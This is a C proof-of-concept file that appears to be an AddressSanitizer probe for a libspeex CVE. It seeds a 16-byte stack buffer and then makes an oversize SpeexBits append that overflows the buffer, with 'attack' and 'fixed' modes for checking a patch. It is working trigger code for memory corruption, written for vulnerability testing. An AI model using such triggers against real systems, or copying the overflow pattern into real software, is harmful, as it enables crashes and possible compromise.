/* ASan stack-path probe for CVE-2026-116741. The non-owner SpeexBits is
 * backed by a STACK array (not heap). A single oversize append after an
 * 8-byte seed writes past the 16-byte stack buffer into an ASan redzone.
 * Built against the pinned clang ASan libspeex trees through public headers
 * only. Not part of run-all.sh / the W245 witness set. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "attack";
   int attack = strcmp(mode, "attack") == 0 || strcmp(mode, "fixed") == 0;
   char buf[BUFSZ];              /* STACK buffer; owner == 0 */
   SpeexBits bits;
   char seed[8];
   char payload[16];
   int i, nbytes, expect;

   memset(buf, 0, sizeof buf);
   speex_bits_init_buffer(&bits, buf, BUFSZ);

   /* Prime 8 bytes: nbBits = 64, pos = 8. */
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);

   /* Vulnerable branch: nchars = buf_size = 16, writes pos 8..23; the
    * bytes at buf+16..23 overflow the 16-byte STACK object. */
   for (i = 0; i < 16; i++)
      payload[i] = (char)('A' + i);
   speex_bits_read_whole_bytes(&bits, payload, attack ? 16 : 8);

   nbytes = speex_bits_nbytes(&bits);
   printf("mode=%s nbytes=%d nbBits=%d owner=%d buf_size=%d buf=%p\n",
          mode, nbytes, bits.nbBits, bits.owner, bits.buf_size, (void *)buf);
   expect = strcmp(mode, "fixed") == 0 ? 15 : (attack ? 24 : 16);
   speex_bits_destroy(&bits);
   return nbytes == expect ? 0 : 1;
}
